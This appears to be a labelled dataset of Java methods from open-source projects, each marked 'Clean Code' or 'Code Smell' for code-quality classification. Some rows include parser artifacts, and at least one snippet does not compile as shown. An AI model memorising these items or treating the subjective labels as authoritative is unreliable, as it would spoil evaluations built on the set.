text,label,text_label
"@Test public void testFilterUpdate(){
  adapter.mFilter.status=ConnectionDescriptor.Status.STATUS_ACTIVE;
  adapter.refreshFilteredConnections();
  reg.newConnections(new ConnectionDescriptor[]{newConnection(false),newConnection(true),newConnection(true),newConnection(true),newConnection(true),newConnection(true),newConnection(true),newConnection(false)});
  reg.newConnections(new ConnectionDescriptor[]{newConnection(true),newConnection(false),newConnection(false),newConnection(true)});
  assertEquals(5,adapter.getItemCount());
  assertEquals(4,adapter.getItem(0).incr_id);
  assertEquals(11,adapter.getItem(4).incr_id);
  pendingEvents.clear();
  reg.connectionsUpdates(new ConnectionUpdate[]{connUpdate(0,UpdateType.UPDATE_STATS),connUpdate(5,UpdateType.UPDATE_STATS),connUpdate(7,UpdateType.UPDATE_STATS),connUpdate(11,UpdateType.UPDATE_STATS)});
  ArraySet<Integer> updated=getNotifiedPositions(ChangeType.ITEMS_UPDATED);
  assertEquals(2,updated.size());
  assertTrue(updated.contains(1));
  assertTrue(updated.contains(4));
  assertEquals(adapter.getItem(1).sent_pkts,1);
  assertEquals(adapter.getItem(4).sent_pkts,1);
  assertEquals(adapter.getItem(2).sent_pkts,0);
}",0,Clean Code
"public void setHorizontalPadding(float padding,float progress,boolean allowShare){
  float leftPadding=-padding * (1f - progress);
  float rightPadding=-(padding + dp(40)) * (1f - progress);
  float s=0.5f + 0.5f * progress;
  emojiButtonPaddingScale=s;
  emojiButtonPaddingAlpha=progress;
  updateEmojiButtonParams();
  emojiButton.setTranslationX(-leftPadding);
  messageTextPaddingTranslationX=-leftPadding - dp(31) * (1f - progress);
  if (recordDeleteImageView != null) {
    recordDeleteImageView.setTranslationX(-leftPadding);
  }
  if (recordCircle != null) {
    recordCircle.setTranslationX(rightPadding);
  }
  if (controlsView != null) {
    controlsView.setTranslationX(rightPadding);
  }
  if (recordTimeContainer != null) {
    recordTimeContainer.setTranslationX(-leftPadding);
  }
  if (recordedAudioPlayButton != null) {
    recordedAudioPlayButton.setTranslationX(-leftPadding);
  }
  if (recordedAudioTimeTextView != null) {
    recordedAudioTimeTextView.setTranslationX(leftPadding);
  }
  sendButtonContainer.setTranslationX(rightPadding);
  sendButtonContainer.setAlpha(allowShare ? progress : 1f);
  sendButtonEnabled=allowShare ? progress == 1f : true;
  attachLayoutPaddingTranslationX=rightPadding;
  attachLayoutPaddingAlpha=progress;
  updateAttachLayoutParams();
  updateMessageTextParams();
  float newPadding=padding * (1f - progress);
  if (horizontalPadding != newPadding) {
    horizontalPadding=newPadding;
    if (seekBarWaveform != null && recordedAudioSeekBar != null) {
      recordedAudioSeekBar.setTranslationX(horizontalPadding);
      recordedAudioSeekBar.invalidate();
      seekBarWaveform.setSize((int)(recordedAudioSeekBar.getMeasuredWidth() - horizontalPadding * 2),recordedAudioSeekBar.getMeasuredHeight());
    }
    if (recordedAudioBackground != null) {
      recordedAudioBackground.invalidate();
    }
  }
  if (messageEditText != null) {
    float scale=lerp(0.88f,1f,progress);
    messageEditText.setPivotX(0);
    messageEditText.setPivotY(messageEditText.getMeasuredHeight() / 2f);
    messageEditText.setScaleX(scale);
    messageEditText.setScaleY(scale);
    messageEditText.setHintRightOffset(lerp(dp(30),0,progress));
  }
}",0,Clean Code
"private HopEntry addOrEditEntry(HopEntry e){
  JTextField txtHost=new SkinnedTextField(30);
  JSpinner spPort=new JSpinner(new SpinnerNumberModel(22,1,SessionInfoPanel.DEFAULT_MAX_PORT,1));
  JTextField txtUser=new SkinnedTextField(30);
  JPasswordField txtPassword=new JPasswordField(30);
  Box b1=Box.createHorizontalBox();
  JTextField txtKeyFile=new SkinnedTextField(30);
  JButton btnBrowse=new JButton(""..."");
  b1.add(txtKeyFile);
  b1.add(Box.createHorizontalStrut(10));
  b1.add(btnBrowse);
  if (e != null) {
    if (e.getHost() != null)     txtHost.setText(e.getHost());
    if (e.getUser() != null)     txtUser.setText(e.getUser());
    if (e.getKeypath() != null)     txtKeyFile.setText(e.getKeypath());
    spPort.setValue((Integer)e.getPort());
  }
  btnBrowse.addActionListener(ev -> {
    JFileChooser jfc=new JFileChooser();
    jfc.setFileHidingEnabled(false);
    if (jfc.showOpenDialog(null) == JFileChooser.APPROVE_OPTION) {
      File f=jfc.getSelectedFile();
      txtKeyFile.setText(f.getAbsolutePath());
    }
  }
);
  while (JOptionPane.showOptionDialog(this,new Object[]{""Host"",txtHost,""Port"",spPort,""User"",txtUser,""Password"",txtPassword,""Private key"",txtKeyFile},""Hop entry"",JOptionPane.OK_CANCEL_OPTION,JOptionPane.PLAIN_MESSAGE,null,null,null) == JOptionPane.OK_OPTION) {
    String host=txtHost.getText();
    String user=txtUser.getText();
    String password=txtPassword.getPassword().length > 0 ? new String(txtPassword.getPassword()) : null;
    String path=txtKeyFile.getText();
    int port=(Integer)spPort.getValue();
    if (host.length() < 1 || user.length() < 1 || port <= 0) {
      JOptionPane.showMessageDialog(this,""Invalid input: all fields mandatory"");
      continue;
    }
    if (e == null) {
      e=new HopEntry();
      e.setId(UUID.randomUUID().toString());
    }
    e.setHost(host);
    e.setPassword(password);
    e.setUser(user);
    e.setPort(port);
    e.setKeypath(path);
    return e;
  }
  return null;
}",0,Clean Code
"@Override public QuitLineupCsReq mergeFrom(final QuitLineupCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasPlaneId()) {
    setPlaneId(other.planeId);
  }
  if (other.hasBaseAvatarId()) {
    setBaseAvatarId(other.baseAvatarId);
  }
  if (other.hasIndex()) {
    setIndex(other.index);
  }
  if (other.hasExtraLineupType()) {
    setExtraLineupTypeValue(other.extraLineupType);
  }
  if (other.hasAvatarType()) {
    setAvatarTypeValue(other.avatarType);
  }
  if (other.hasIsVirtual()) {
    setIsVirtual(other.isVirtual);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@43a7e53b!org.eclipse.jdt.core.dom.MethodDeclaration@30ff1a86",0,Clean Code
"public void generateOtherInfo(){
  isStopped=(flags & ApplicationInfo.FLAG_STOPPED) != 0;
  isPersistent=(flags & ApplicationInfo.FLAG_PERSISTENT) != 0;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
    usesCleartextTraffic=(flags & ApplicationInfo.FLAG_USES_CLEARTEXT_TRAFFIC) != 0;
  }
  for (  int userId : userIds) {
    canReadLogs|=(PermissionCompat.checkPermission(Manifest.permission.READ_LOGS,packageName,userId) == PackageManager.PERMISSION_GRANTED);
    isAppInactive|=UsageStatsManagerCompat.isAppInactive(packageName,userId);
  }
  allowClearingUserData=(flags & ApplicationInfo.FLAG_ALLOW_CLEAR_USER_DATA) != 0;
  if (userIds.length > 1) {
    int appId=UserHandleHidden.getAppId(uid);
    uidOrAppIds=userIds.length + ""+"" + appId;
  }
 else   if (userIds.length == 1) {
    uidOrAppIds=String.valueOf(uid);
  }
 else   uidOrAppIds="""";
  if (sha != null) {
    try {
      issuerShortName=""CN="" + (sha.first).split(""CN="",2)[1];
    }
 catch (    ArrayIndexOutOfBoundsException e) {
      issuerShortName=sha.first;
    }
    if (TextUtils.isEmpty(sha.second)) {
      sha=null;
    }
  }
  versionTag=versionName;
  if (isInstalled && (flags & ApplicationInfo.FLAG_HARDWARE_ACCELERATED) == 0)   versionTag=""_"" + versionTag;
  if ((flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0)   versionTag=""debug"" + versionTag;
  if ((flags & ApplicationInfo.FLAG_TEST_ONLY) != 0)   versionTag=""~"" + versionTag;
  appTypePostfix="""";
  if ((flags & ApplicationInfo.FLAG_LARGE_HEAP) != 0)   appTypePostfix+=""#"";
  if ((flags & ApplicationInfo.FLAG_SUSPENDED) != 0)   appTypePostfix+=""掳"";
  if ((flags & ApplicationInfo.FLAG_MULTIARCH) != 0)   appTypePostfix+=""X"";
  if ((flags & ApplicationInfo.FLAG_HAS_CODE) == 0)   appTypePostfix+=""0"";
  if ((flags & ApplicationInfo.FLAG_VM_SAFE_MODE) != 0)   appTypePostfix+=""?"";
  if (sdk != null && sdk > 0) {
    sdkString=""SDK "" + sdk;
  }
  diffInstallUpdateInDays=TimeUnit.DAYS.convert(lastUpdateTime - firstInstallTime,TimeUnit.MILLISECONDS);
  if (backup != null) {
    lastBackupDays=TimeUnit.DAYS.convert(System.currentTimeMillis() - backup.backupTime,TimeUnit.MILLISECONDS);
    backupFlagsStr=new StringBuilder();
    if (backup.getFlags().backupApkFiles())     backupFlagsStr.append(""apk"");
    if (backup.getFlags().backupData()) {
      if (backupFlagsStr.length() > 0)       backupFlagsStr.append(""+"");
      backupFlagsStr.append(""data"");
    }
    if (backup.hasRules) {
      if (backupFlagsStr.length() > 0)       backupFlagsStr.append(""+"");
      backupFlagsStr.append(""rules"");
    }
  }
}",1,Code Smell
"@Override public CfAdExample getExampleByQuery(CfAdQuery cfAdQuery){
  CfAdExample cfAdExample=new CfAdExample();
  CfAdExample.Criteria criteria=cfAdExample.createCriteria();
  if (cfAdQuery.getId() != null) {
    criteria.andIdEqualTo(cfAdQuery.getId());
  }
  if (cfAdQuery.getMaterialType() != null) {
    criteria.andMaterialTypeEqualTo(cfAdQuery.getMaterialType());
  }
  if (cfAdQuery.getMinStartTime() != null) {
    criteria.andStartTimeGreaterThanOrEqualTo(cfAdQuery.getMinStartTime());
  }
  if (cfAdQuery.getMaxStartTime() != null) {
    criteria.andStartTimeLessThanOrEqualTo(cfAdQuery.getMaxStartTime());
  }
  if (cfAdQuery.getMinEndTime() != null) {
    criteria.andEndTimeGreaterThanOrEqualTo(cfAdQuery.getMinEndTime());
  }
  if (cfAdQuery.getMaxEndTime() != null) {
    criteria.andEndTimeLessThanOrEqualTo(cfAdQuery.getMaxEndTime());
  }
  if (StringUtils.isNotEmpty(cfAdQuery.getOrderBy())) {
    cfAdExample.setOrderByClause(cfAdQuery.getOrderBy());
  }
  if (cfAdQuery.getPage() != null && cfAdQuery.getSize() != null) {
    PageHelper.startPage(cfAdQuery.getPage(),cfAdQuery.getSize());
  }
  return cfAdExample;
}
",0,Clean Code
"@Override public void run(){
  String address=AddressUtils.getRealAddressByIP(ip);
  StringBuilder s=new StringBuilder();
  s.append(LogUtils.getBlock(ip));
  s.append(address);
  s.append(LogUtils.getBlock(userName));
  s.append(LogUtils.getBlock(userId));
  s.append(LogUtils.getBlock(status));
  s.append(LogUtils.getBlock(message));
  sys_user_logger.info(s.toString(),args);
  String os=userAgent.getOperatingSystem().getName();
  String browser=userAgent.getBrowser().getName();
  SysLoginLogEntity logininfor=new SysLoginLogEntity();
  logininfor.setLoginTime(new Date());
  logininfor.setUserName(userName);
  logininfor.setUserId(userId);
  logininfor.setIpaddr(ip);
  logininfor.setLoginLocation(address);
  logininfor.setBrowser(browser);
  logininfor.setOs(os);
  logininfor.setMsg(message);
  if (StringUtils.equalsAny(status,Constants.LOGIN_SUCCESS,Constants.LOGOUT,Constants.REGISTER)) {
    logininfor.setStatus(Constants.SUCCESS);
  }
 else   if (Constants.LOGIN_FAIL.equals(status)) {
    logininfor.setStatus(Constants.FAIL);
  }
  SpringUtils.getBean(SysLoginLogService.class).insertLogininfor(logininfor);
}
@Override public void run(){
  SpringUtils.getBean(SysOperLogService.class).insertOperlog(operLog);
}
",0,Clean Code
"public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children){
  setupWithBottomNavigationView(bottomNavigationView,groupScene,containerId,children,null);
}
public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children,@Nullable final BottomNavigationView.OnNavigationItemSelectedListener onNavigationItemSelectedListener){
  if (children.size() == 0) {
    throw new IllegalArgumentException(""children can't be empty"");
  }
  final List<String> menuIdList=new ArrayList<>();
  int menuSize=bottomNavigationView.getMenu().size();
  for (int i=0; i < menuSize; i++) {
    menuIdList.add(String.valueOf(bottomNavigationView.getMenu().getItem(i).getItemId()));
  }
  bottomNavigationView.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener(){
    @Override public boolean onNavigationItemSelected(    @NonNull MenuItem item){
      if (onNavigationItemSelectedListener != null) {
        onNavigationItemSelectedListener.onNavigationItemSelected(item);
      }
      item.setChecked(true);
      String tag=String.valueOf(item.getItemId());
      Scene scene=groupScene.findSceneByTag(tag);
      if (scene == null) {
        scene=children.get(item.getItemId());
      }
      if (!groupScene.isAdded(scene)) {
        groupScene.add(containerId,scene,tag);
      }
 else       if (!groupScene.isShowing(scene)) {
        groupScene.show(scene);
      }
      for (int i=0; i < menuIdList.size(); i++) {
        Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
        if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
          groupScene.hide(otherScene);
        }
      }
      return true;
    }
  }
);
  Map.Entry<Integer,Scene> firstItem=children.entrySet().iterator().next();
  String tag=String.valueOf(firstItem.getKey());
  Scene scene=groupScene.findSceneByTag(tag);
  if (scene == null) {
    scene=firstItem.getValue();
  }
  if (!groupScene.isAdded(scene)) {
    groupScene.add(containerId,scene,tag);
  }
 else   if (!groupScene.isShowing(scene)) {
    groupScene.show(scene);
  }
  for (int i=0; i < menuIdList.size(); i++) {
    Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
    if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
      groupScene.hide(otherScene);
    }
  }
  bottomNavigationView.getMenu().findItem(firstItem.getKey()).setChecked(true);
}",1,Code Smell
"public static SqlStatementInfo sanitize(Object query){
  if (query instanceof String) {
    return sanitizeString((String)query);
  }
  if ((QUERY_CLASS != null && QUERY_CLASS.isAssignableFrom(query.getClass())) || (STATEMENT_CLASS != null && STATEMENT_CLASS.isAssignableFrom(query.getClass()))) {
    return sanitizeString(query.toString());
  }
  String queryClassName=query.getClass().getName();
  if (queryClassName.equals(""com.couchbase.client.java.view.ViewQuery"") || queryClassName.equals(""com.couchbase.client.java.view.SpatialViewQuery"")) {
    return SqlStatementInfo.create(query.toString(),null,null);
  }
  if (N1QL_QUERY_CLASS != null && N1QL_QUERY_CLASS.isAssignableFrom(query.getClass())) {
    String statement=getStatementString(N1QL_GET_STATEMENT,query);
    if (statement != null) {
      return sanitizeString(statement);
    }
  }
  if (ANALYTICS_QUERY_CLASS != null && ANALYTICS_QUERY_CLASS.isAssignableFrom(query.getClass())) {
    String statement=getStatementString(ANALYTICS_GET_STATEMENT,query);
    if (statement != null) {
      return sanitizeString(statement);
    }
  }
  return SqlStatementInfo.create(query.getClass().getSimpleName(),null,null);
}",0,Clean Code
"/** 
 * execute watch event
 */
private synchronized void watchIfNecessary() throws PluginLifeCycleException {
  if (watched.compareAndSet(false,true)) {
    List<EnhanceModel> enhanceModels=getEnhanceModels();
    if (CollectionUtils.isEmpty(enhanceModels)) {
      throw new PluginLifeCycleException(""enhance models is empty, plugin type is "" + identity());
    }
    for (    EnhanceModel em : enhanceModels) {
      EventWatchBuilder.IBuildingForBehavior behavior=null;
      EventWatchBuilder.IBuildingForClass builder4Class=new EventWatchBuilder(watcher).onClass(em.getClassPattern());
      builder4Class.isIncludeBootstrap(em.isIncludeBootstrap());
      if (em.isIncludeSubClasses()) {
        builder4Class=builder4Class.includeSubClasses();
      }
      for (      EnhanceModel.MethodPattern mp : em.getMethodPatterns()) {
        behavior=builder4Class.onBehavior(mp.getMethodName());
        if (ArrayUtils.isNotEmpty(mp.getParameterType())) {
          behavior.withParameterTypes(mp.getParameterType());
        }
        if (ArrayUtils.isNotEmpty(mp.getAnnotationTypes())) {
          behavior.hasAnnotationTypes(mp.getAnnotationTypes());
        }
      }
      if (behavior != null) {
        int watchId=behavior.onWatch(getEventListener(listener),em.getWatchTypes()).getWatchId();
        watchIds.add(watchId);
        log.info(""add watcher success,type={},watcherId={}"",getType().name(),watchId);
      }
    }
  }
}",1,Code Smell
"private void addInstruction(Insn insn){
  addInstruction(insn,null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@66a8d7b9",0,Clean Code
"@Override protected void decode(ChannelHandlerContext ctx,ByteBuf buffer,List<Object> out) throws Exception {
  buffer.markReaderIndex();
  int totalLen=buffer.readInt();
  LOGGER.debug(""decode totalLen : {}"",totalLen);
  if (totalLen != buffer.readableBytes()) {
    LOGGER.error(""totalLen is not equal readableBytes.total:"" + totalLen + "";readableBytes:""+ buffer.readableBytes());
    buffer.resetReaderIndex();
    throw new Exception(""totalLen is not equal readableBytes.total"");
  }
  int msgType=buffer.readByte() & 0x1f;
  if (msgType == 4) {
    LOGGER.info(""debug decode"");
  }
  if (msgType == 3 | msgType == 5) {
    int bodyLength=buffer.readInt();
    if (bodyLength >= totalLen) {
      LOGGER.error(""bodyLen is greater than totalLen.totalLen:"" + totalLen + "";bodyLen:""+ bodyLength);
      buffer.resetReaderIndex();
      throw new Exception(""bodyLen is greater than totalLen.totalLen"");
    }
    byte[] bodyBytes=null;
    if (bodyLength > 0) {
      bodyBytes=new byte[bodyLength];
      buffer.readBytes(bodyBytes);
    }
    int attrLength=buffer.readInt();
    byte[] attrBytes=null;
    if (attrLength > 0) {
      attrBytes=new byte[attrLength];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(bodyBytes,new String(attrBytes,StandardCharsets.UTF_8));
    object.setMsgtype(5);
    out.add(object);
  }
 else   if (msgType == 7) {
    int seqId=buffer.readInt();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(new String(attrBytes,StandardCharsets.UTF_8));
    object.setMessageId(String.valueOf(seqId));
    buffer.readShort();
    object.setMsgtype(msgType);
    out.add(object);
  }
 else   if (msgType == 8) {
    buffer.skipBytes(4 + 1 + 4);
    final short load=buffer.readShort();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    buffer.skipBytes(2);
    String attrs=(attrBytes == null ? """" : new String(attrBytes,StandardCharsets.UTF_8));
    EncodeObject object=new EncodeObject(attrs);
    object.setMsgtype(8);
    object.setLoad(load);
    out.add(object);
  }
}",1,Code Smell
"public boolean manageFlows(Level world,BlockPos pos,FluidStack internalFluid,Predicate<FluidStack> extractionPredicate){
  Optional<FluidNetwork> retainedNetwork=network;
  network=Optional.empty();
  if (!source.isPresent() && !determineSource(world,pos))   return false;
  FlowSource flowSource=source.get();
  if (!hasFlow()) {
    if (!hasPressure())     return false;
    boolean prioritizeInbound=comparePressure() < 0;
    for (    boolean trueFalse : Iterate.trueAndFalse) {
      boolean inbound=prioritizeInbound == trueFalse;
      if (pressure.get(inbound) == 0)       continue;
      if (tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid))       return true;
    }
    return false;
  }
  Flow flow=this.flow.get();
  FluidStack provided=flow.inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid;
  if (!hasPressure() || provided.isEmpty() || !provided.isFluidEqual(flow.fluid)) {
    this.flow=Optional.empty();
    return true;
  }
  if (flow.inbound != comparePressure() < 0) {
    boolean inbound=!flow.inbound;
    if (inbound && !provided.isEmpty() || !inbound && !internalFluid.isEmpty()) {
      FluidPropagator.resetAffectedFluidNetworks(world,pos,side);
      tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid);
      return true;
    }
  }
  flowSource.whileFlowPresent(world,flow.inbound);
  if (!flowSource.isEndpoint())   return false;
  if (!flow.inbound)   return false;
  network=retainedNetwork;
  if (!hasNetwork())   network=Optional.of(new FluidNetwork(world,new BlockFace(pos,side),flowSource::provideHandler));
  network.get().tick();
  return false;
}",1,Code Smell
"/** 
 * If a record type allows implicit references to fields, recursively looks into the fields. Otherwise returns immediately. 
 */
void resolveInNamespace(SqlValidatorNamespace ns,boolean nullable,List<String> names,SqlNameMatcher nameMatcher,Path path,Resolved resolved){
  if (names.isEmpty()) {
    resolved.found(ns,nullable,this,path,null);
    return;
  }
  final RelDataType rowType=ns.getRowType();
  if (rowType.isStruct()) {
    SqlValidatorTable validatorTable=ns.getTable();
    if (validatorTable instanceof Prepare.PreparingTable) {
      Table t=((Prepare.PreparingTable)validatorTable).unwrap(Table.class);
      if (t instanceof CustomColumnResolvingTable) {
        final List<Pair<RelDataTypeField,List<String>>> entries=((CustomColumnResolvingTable)t).resolveColumn(rowType,validator.getTypeFactory(),names);
        for (        Pair<RelDataTypeField,List<String>> entry : entries) {
          final RelDataTypeField field=entry.getKey();
          final List<String> remainder=entry.getValue();
          final SqlValidatorNamespace ns2=new FieldNamespace(validator,field.getType());
          final Step path2=path.plus(rowType,field.getIndex(),field.getName(),StructKind.FULLY_QUALIFIED);
          resolveInNamespace(ns2,nullable,remainder,nameMatcher,path2,resolved);
        }
        return;
      }
    }
    final String name=names.get(0);
    final RelDataTypeField field0=nameMatcher.field(rowType,name);
    if (field0 != null) {
      final SqlValidatorNamespace ns2=ns.lookupChild(field0.getName());
      final Step path2=path.plus(rowType,field0.getIndex(),field0.getName(),StructKind.FULLY_QUALIFIED);
      resolveInNamespace(ns2,nullable,names.subList(1,names.size()),nameMatcher,path2,resolved);
    }
 else {
      for (      RelDataTypeField field : rowType.getFieldList()) {
switch (field.getType().getStructKind()) {
case PEEK_FIELDS:
case PEEK_FIELDS_DEFAULT:
case PEEK_FIELDS_NO_EXPAND:
          final Step path2=path.plus(rowType,field.getIndex(),field.getName(),field.getType().getStructKind());
        final SqlValidatorNamespace ns2=ns.lookupChild(field.getName());
      resolveInNamespace(ns2,nullable,names,nameMatcher,path2,resolved);
  }
}
}
}
}",1,Code Smell
"public static void main(String[] args) throws Exception {
  DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();
  factory.setNamespaceAware(false);
  DocumentBuilder builder=factory.newDocumentBuilder();
  Document doc;
  try (FileInputStream in=new FileInputStream(""mastodon/src/main/res/values/strings.xml"")){
    doc=builder.parse(in);
  }
   NodeList list=doc.getDocumentElement().getChildNodes();
  for (int i=0; i < list.getLength(); i++) {
    if (list.item(i) instanceof Element) {
      String name=el.getAttribute(""name"");
      String value;
      if (""string"".equals(el.getTagName())) {
        value=el.getTextContent();
      }
 else       if (""plurals"".equals(el.getTagName())) {
        value=el.getElementsByTagName(""item"").item(0).getTextContent();
      }
 else {
        System.out.println(""Warning: unexpected tag "" + name);
        continue;
      }
      ArrayList<String> placeholders=new ArrayList<>();
      Matcher matcher=fsPattern.matcher(value);
      while (matcher.find()) {
        placeholders.add(matcher.group());
      }
      placeholdersInStrings.put(name,placeholders);
    }
  }
  for (  File file : new File(""mastodon/src/main/res"").listFiles()) {
    if (file.getName().startsWith(""values-"")) {
      File stringsXml=new File(file,""strings.xml"");
      if (stringsXml.exists()) {
        processFile(stringsXml);
      }
    }
  }
  if (errorCount > 0) {
    System.err.println(""Found "" + errorCount + "" problems in localized strings"");
    System.exit(1);
  }
}",0,Clean Code
"public void updateTopicData(long dialogId,TLRPC.TL_forumTopic fromTopic,int flags){
  if (fromTopic == null) {
    return;
  }
  storageQueue.postRunnable(() -> {
    SQLitePreparedStatement state=null;
    SQLiteCursor cursor=null;
    try {
      if ((flags & TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) != 0) {
        state=database.executeFast(""UPDATE topics SET total_messages_count = ? WHERE did = ? AND topic_id = ?"");
        state.requery();
        state.bindInteger(1,fromTopic.totalMessagesCount);
        state.bindLong(2,dialogId);
        state.bindInteger(3,fromTopic.id);
        state.step();
        state.dispose();
        if (flags == TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) {
          return;
        }
      }
      TLRPC.TL_forumTopic topicToUpdate=null;
      cursor=database.queryFinalized(String.format(Locale.US,""SELECT data FROM topics WHERE did = %d AND topic_id = %d"",dialogId,fromTopic.id));
      if (cursor.next()) {
        NativeByteBuffer data=cursor.byteBufferValue(0);
        if (data != null) {
          topicToUpdate=TLRPC.TL_forumTopic.TLdeserialize(data,data.readInt32(true),true);
          data.reuse();
        }
      }
      cursor.dispose();
      cursor=null;
      if (topicToUpdate != null) {
        if ((flags & TopicsController.TOPIC_FLAG_TITLE) != 0) {
          topicToUpdate.title=fromTopic.title;
        }
        if ((flags & TopicsController.TOPIC_FLAG_ICON) != 0) {
          topicToUpdate.icon_emoji_id=fromTopic.icon_emoji_id;
          topicToUpdate.flags|=1;
        }
        if ((flags & TopicsController.TOPIC_FLAG_PIN) != 0) {
          topicToUpdate.pinned=fromTopic.pinned;
          topicToUpdate.pinnedOrder=fromTopic.pinnedOrder;
        }
        int pinnedOrder=topicToUpdate.pinned ? 1 + topicToUpdate.pinnedOrder : 0;
        if ((flags & TopicsController.TOPIC_FLAG_CLOSE) != 0) {
          topicToUpdate.closed=fromTopic.closed;
        }
        if ((flags & TopicsController.TOPIC_FLAG_HIDE) != 0) {
          topicToUpdate.hidden=fromTopic.hidden;
        }
        state=database.executeFast(""UPDATE topics SET data = ?, pinned = ?, hidden = ? WHERE did = ? AND topic_id = ?"");
        database.beginTransaction();
        NativeByteBuffer data=new NativeByteBuffer(topicToUpdate.getObjectSize());
        topicToUpdate.serializeToStream(data);
        state.bindByteBuffer(1,data);
        state.bindInteger(2,pinnedOrder);
        state.bindInteger(3,topicToUpdate.hidden ? 1 : 0);
        state.bindLong(4,dialogId);
        state.bindInteger(5,topicToUpdate.id);
        state.step();
        data.reuse();
      }
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (state != null) {
        state.dispose();
      }
      if (cursor != null) {
        cursor.dispose();
      }
      database.commitTransaction();
    }
  }
);
}",1,Code Smell
